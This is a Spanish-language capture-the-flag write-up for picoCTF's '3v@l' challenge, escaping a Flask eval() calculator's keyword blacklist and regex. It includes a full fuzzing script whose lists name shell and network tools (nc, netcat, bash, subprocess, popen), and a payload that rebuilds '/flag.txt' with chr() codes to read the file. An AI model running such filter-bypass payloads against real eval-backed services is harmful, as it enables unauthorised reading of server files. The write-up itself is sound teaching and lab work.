# Writeup: 3v@l
**Categoría:** Medium
**Fecha de conversión:** 2026-04-24

---

Writeup: 3v@1 – Eval Sandbox Escape (picoCTF)

1. Reconocimiento inicial

El reto presenta una calculadora de préstamos bancarios que permite introducir una fórmula matemática. Al enviarla, el servidor la evalúa y devuelve el resultado.


La página HTML contenía un comentario con un TODO que revelaba las defensas:


```
    Blacklist de palabras clave: os, eval, exec, bind, connect, python, socket, ls, cat, shell, bind

    Regex de bloqueo: 0x[0-9A-Fa-f]+|\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.

```

Además, se indicaba que el backend es Python + Flask y que se utiliza eval() para evaluar la expresión.

2. Análisis automatizado de las restricciones

Para no depender únicamente del comentario, se desarrolló un script de fuzzing completo que envía cientos de payloads y analiza las respuestas, detectando:


```
    Palabras bloqueadas (la blacklist)

    Caracteres prohibidos (la regex)

    Funciones permitidas

    Patrones de ofuscación viables

```

El script (incluido al final) generó el siguiente resumen:

text


Blocked keywords: eval, exec, ls, cat, os, socket, bind, connect, ...

Allowed keywords: vars, dir, int, str, bytes, bytearray, assert (con argumento)

Blocked characters: '/', '\\', '..', '...', '\\u', '\\x', '//'

Allowed characters: '.', '`', '$', '(', ')', '[', ']', '{', '}', '@', '#', '&', '|', ';', ' ', '%', '0x', ... (muchos operadores)


Detected regex patterns: '/flag.txt', 'test.txt', '0x4141', '\u0041', '%41', '../', '\\', '\.'


Conclusiones del análisis:


```
    La barra / está bloqueada → no podemos escribir rutas directamente.

    El punto . seguido de una extensión (ej. .txt) también está bloqueado.

    Las comillas simples y dobles no son bloqueadas (el script mostró syntax_error porque una sola comilla o doble comilla sin cerrar da error de sintaxis, no por filtro).

    La función open no aparece bloqueada (el script la probó y no respondió "forbidden").

    El acceso a __builtins__ es posible.

    chr() y ord() tampoco están bloqueados.

```

3. Construcción del payload

Dado que / y .txt están prohibidos, pero chr() funciona, construimos la ruta /flag.txt mediante códigos ASCII:


```
    / → chr(47)

    f → chr(102)

    l → chr(108)

    a → chr(97)

    g → chr(103)

    . → chr(46)

    t → chr(116)

    x → chr(120)

    t → chr(116)

```

Concatenamos con + y lo pasamos a open().read():

python


open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()


Este string no contiene ninguna barra literal, ni punto seguido de txt, ni palabras bloqueadas. Además, open y read son funciones permitidas.

4. Explotación

Se introduce el payload en el campo de texto de la calculadora y se pulsa "Execute". El servidor evalúa la expresión y muestra el contenido del archivo:

text


Result: picoCTF{************************************}


### Flag conseguido.

Script completo de análisis (Python)


El siguiente script automatiza todo el proceso de fuzzing, detección de filtros y generación de consejos. Se ha utilizado exactamente para obtener la salida mostrada anteriormente.

python


```bash
#!/usr/bin/env python3
```

"""

Bank-Loan Calculator - Advanced Sandbox Analysis & Fuzzing Script

Author: CTF Player

Usage: python3 sandbox_analysis.py <target_url>

Example: python3 sandbox_analysis.py http://shape-facility.picoctf.net:60507

"""


import requests

import sys

import re

import json

import time

from urllib.parse import urljoin


```bash
# Palabras candidatas a ser bloqueadas (blacklist)
```

## Keywords = [

```
    "eval", "exec", "compile", "__import__", "globals", "locals", "vars", "dir",
    "os", "subprocess", "socket", "sys", "platform", "shutil", "ctypes", "pty",
    "system", "popen", "spawn", "fork", "execve", "execl", "posix", "win32",
    "ls", "cat", "head", "tail", "grep", "find", "nc", "netcat", "bash", "sh",
    "bind", "connect", "listen", "accept", "send", "recv",
    "open", "file", "read", "write", "close", "seek", "tell", "flush",
    "chr", "ord", "hex", "oct", "bin",
    "int", "str", "bytes", "bytearray",
    "__class__", "__bases__", "__subclasses__", "__mro__", "__dict__",
    "assert", "breakpoint", "input", "raw_input",
    "True", "False", "None", "Ellipsis", "NotImplemented"
```

]


```bash
# Caracteres especiales a probar (inyección, rutas, etc.)
```

## Special_chars = [

```
    "/", "\\", ".", "..", "...", "'", '"', "`", "$", "(", ")", "[", "]",
    "{", "}", "@", "#", "&", "|", ";", "\n", "\r", "\t", " ",
    "%", "0x", "\\u", "\\x", "~", "!", "?", ":", "=", "+", "-", "*", "**",
    "//", "<", ">", "^", "|"
```

]


```bash
# Expresiones para detectar patrones de regex
```

## Regex_patterns = [

```
    "/flag.txt",      # slash y punto
    "test.txt",       # punto + extensión
    "0x4141",         # hexadecimal literal
    "\\u0041",        # unicode escape
    "%41",            # url encoding
    "../",            # doble punto + slash
    "\\\\",           # backslash doble
    "\\.",            # punto escapado
```

]


class SandboxAnalyzer:

```
    def __init__(self, base_url, endpoint="/execute", field="code"):
        self.base_url = base_url.rstrip('/')
        self.endpoint = endpoint
        self.field = field
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "CTF-Sandbox-Analyzer"})

        self.blocked_keywords = []
        self.allowed_keywords = []
        self.blocked_chars = []
        self.allowed_chars = []
        self.detected_regex = []

    def send(self, code):
        """Envía código al endpoint y devuelve respuesta cruda y código de estado."""
        try:
            data = {self.field: code}
            resp = self.session.post(urljoin(self.base_url, self.endpoint), data=data, timeout=5)
            return resp.text, resp.status_code
        except Exception as e:
            return f"Error: {e}", 0

    def is_blocked(self, response_text):
        """Detecta si la respuesta indica que el código fue bloqueado (keyword o regex)."""
        lower = response_text.lower()
        indicators = ["forbidden keyword", "detected forbidden", "blocked", "malicious"]
        return any(ind in lower for ind in indicators)

    def is_syntax_error(self, response_text):
        """Detecta si la respuesta es un error de sintaxis (no bloqueo)."""
        return "invalid syntax" in response_text.lower()

    def analyze_keywords(self):
        """Prueba cada palabra de KEYWORDS para determinar si está bloqueada o permitida."""
        print("[*] Testing keywords (may take a while)...")
        for kw in KEYWORDS:
            # Probar la palabra sola y con un argumento genérico
            tests = [kw, f"{kw}(1)"]
            blocked = False
            for test in tests:
                resp, _ = self.send(test)
                if self.is_blocked(resp):
                    self.blocked_keywords.append(kw)
                    print(f"    BLOCKED: {kw}")
                    blocked = True
                    break
            if not blocked:
                # Podría ser que no esté bloqueada, pero dar error de sintaxis si no se usa bien
                # Ejemplo: 'assert' solo falla si no se le pasa expresión
                # Se hace una prueba adicional con un uso correcto
                if kw == "assert":
                    # assert necesita una condición
                    resp, _ = self.send("assert(1)")
                    if self.is_blocked(resp):
                        self.blocked_keywords.append(kw)
                        print(f"    BLOCKED: {kw}")
                    else:
                        self.allowed_keywords.append(kw)
                        print(f"    ALLOWED (con argumento): {kw}")
                elif kw == "vars" or kw == "dir":
                    # vars() sin argumento funciona
                    resp, _ = self.send(f"{kw}()")
                    if not self.is_blocked(resp) and not self.is_syntax_error(resp):
                        self.allowed_keywords.append(kw)
                        print(f"    ALLOWED: {kw}")
                    else:
                        self.blocked_keywords.append(kw)
                        print(f"    BLOCKED: {kw}")
                else:
                    # Otros: si da error de sintaxis, puede que esté permitida pero mal usada
                    if self.is_syntax_error(resp):
                        self.allowed_keywords.append(kw)
                        print(f"    ALLOWED (but needs correct syntax): {kw}")
                    else:
                        self.blocked_keywords.append(kw)
                        print(f"    BLOCKED: {kw}")

    def analyze_characters(self):
        """Prueba caracteres individuales para ver cuáles son bloqueados por la regex."""
        print("[*] Testing special characters...")
        for ch in SPECIAL_CHARS:
            # Empaquetar el carácter en una cadena (para evitar errores de sintaxis)
            if ch in ("'", '"'):
                # Las comillas solitarias dan error de sintaxis, no son bloqueadas.
                # Las probamos escapadas o dentro de otra cadena
                code = f"'{ch}'" if ch == '"' else f'"{ch}"'
            elif ch == " ":
                code = "' '"
            elif ch in ("\n", "\r", "\t"):
                code = f"'{ch}'"
            elif ch in ("\\u", "\\x"):
                # Caracteres especiales de escape
                code = f"'{ch}'"
            else:
                code = f"'{ch}'"

            resp, _ = self.send(code)
            if self.is_blocked(resp):
                self.blocked_chars.append(ch)
                print(f"    BLOCKED: '{ch}'")
            elif self.is_syntax_error(resp):
                print(f"    ? '{ch}' -> syntax_error")
            else:
                self.allowed_chars.append(ch)
                print(f"    ALLOWED: '{ch}'")

    def analyze_regex_patterns(self):
        """Prueba patrones que se espera que la regex bloquee."""
        print("[*] Testing regex-specific patterns...")
        for pattern in REGEX_PATTERNS:
            # Escapamos o usamos raw strings según convenga
            code = f"'{pattern}'"
            resp, _ = self.send(code)
            if self.is_blocked(resp):
                self.detected_regex.append(pattern)
                print(f"    BLOCKED (likely regex): {pattern}")
            else:
                print(f"    NOT BLOCKED: {pattern}")

    def full_analysis(self):
        """Ejecuta todas las pruebas y guarda los resultados."""
        print(f"[+] Starting Sandbox Analysis...\n")
        # Baseline test
        print("[*] Baseline test (sending '1'):")
        resp, _ = self.send("1")
        print(f"    Response: {resp[:100]}...")
        if self.is_blocked(resp):
            print("    WARNING: Baseline was blocked! Check target.")
        else:
            print("    Baseline OK.\n")

        self.analyze_keywords()
        print()
        self.analyze_characters()
        print()
        self.analyze_regex_patterns()
        print()

        # Guardar resultados en JSON
        results = {
            "blocked_keywords": list(set(self.blocked_keywords)),
            "allowed_keywords": list(set(self.allowed_keywords)),
            "blocked_chars": self.blocked_chars,
            "allowed_chars": self.allowed_chars,
            "detected_regex_patterns": self.detected_regex,
        }
        with open("sandbox_analysis.json", "w") as f:
            json.dump(results, f, indent=2)
        print("[+] Full results saved to sandbox_analysis.json")

        # Mostrar resumen y consejos
        self.print_summary()

    def print_summary(self):
        print("="*60)
        print("ANALYSIS SUMMARY")
        print("="*60)
        print(f"Blocked keywords: {len(set(self.blocked_keywords))}")
        print(f"  {', '.join(set(self.blocked_keywords)[:20])}")
        print(f"\nAllowed keywords: {len(set(self.allowed_keywords))}")
        print(f"  {', '.join(set(self.allowed_keywords)[:20])}")
        print(f"\nBlocked characters: {self.blocked_chars}")
        print(f"Allowed characters: {self.allowed_chars[:30]}...")
        print(f"\nDetected regex patterns: {self.detected_regex}")

        print("\n" + "="*60)
        print("EXPLOITATION TIPS")
        print("="*60)
        if "open" not in self.blocked_keywords and "open" not in self.blocked_keywords:
            print("✓ 'open' appears allowed. Use open(chr(47)+...).read()")
        else:
            print("? No obvious file-reading functions detected.")
            print("  Try using __builtins__.__dict__ or getattr(__builtins__, 'open') if __builtins__ is allowed.")

        if '/' in self.blocked_chars:
            print("✓ Slash '/' is blocked. Must use chr(47) or other encoding.")
        if '.' in self.blocked_chars:
            print("✓ Dot '.' is blocked. Use chr(46) for dot.")
        if "'" not in self.blocked_chars:
            print("✓ Single quotes are allowed. You can use strings directly if the content is not filtered.")
        if "eval" in self.blocked_keywords:
            print("✓ 'eval' is blocked, but we are already inside an eval context. Use direct expressions.")

        print("\n[+] Analysis complete. Use the information above to craft your payload manually.")

```

def main():

```
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"Example: {sys.argv[0]} http://shape-facility.picoctf.net:60507")
        sys.exit(1)

    target = sys.argv[1]
    print(f"Analyzing target: {target}")
    analyzer = SandboxAnalyzer(target)
    analyzer.full_analysis()

```

if __name__ == "__main__":

```
    main()

```

Cómo usar el script

bash


python3 sandbox_analysis.py http://shape-facility.picoctf.net:60507


El script generará una salida similar a la mostrada en el enunciado y guardará un fichero sandbox_analysis.json con los resultados. Es una herramienta genérica para evaluar eval con filtros.

Lecciones aprendidas


```
    Nunca usar eval() con entrada de usuario sin un sandbox muy restrictivo. Incluso con blacklists y regex, se pueden encontrar vías de ofuscación (como chr()).

    El fuzzing sistemático es clave para entender las defensas de una caja negra.

    chr() + concatenación permite reconstruir cualquier cadena sin usar literales prohibidos.

    El análisis del código fuente (incluso comentarios HTML) puede dar pistas directas.
```

